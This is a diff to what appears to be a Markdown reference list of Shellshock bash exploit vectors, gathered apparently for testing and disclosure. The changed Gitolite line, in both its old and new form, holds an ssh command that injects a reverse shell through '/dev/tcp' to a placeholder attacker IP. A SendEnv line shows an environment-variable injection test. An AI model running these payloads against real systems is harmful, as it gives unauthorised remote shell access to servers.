@@ -76,7 +76,7 @@ _will create a file named echo in cwd with date in it, if vulnerable_
   + https://twitter.com/JZdziarski/status/515205581226123264/photo/1
 + SendEnv: `LC_X='() { :; }; echo vulnerable' ssh foo@bar.org -o SendEnv=LC_X`
 + Gitolite - https://twitter.com/Grifo/status/515089986161766400
-  + $ ssh GITOLITEUSER@VULNERABLEIP '() { gry;}; /bin/bash -i >& /dev/tcp/REVERSESHELLIP/PORT 0>&1'
+  + $ `ssh GITOLITEUSER@VULNERABLEIP '() { ignore;}; /bin/bash -i >& /dev/tcp/REVERSESHELLIP/PORT 0>&1'`
   + (necessary to have a git account on the server)
 
 ## OSX
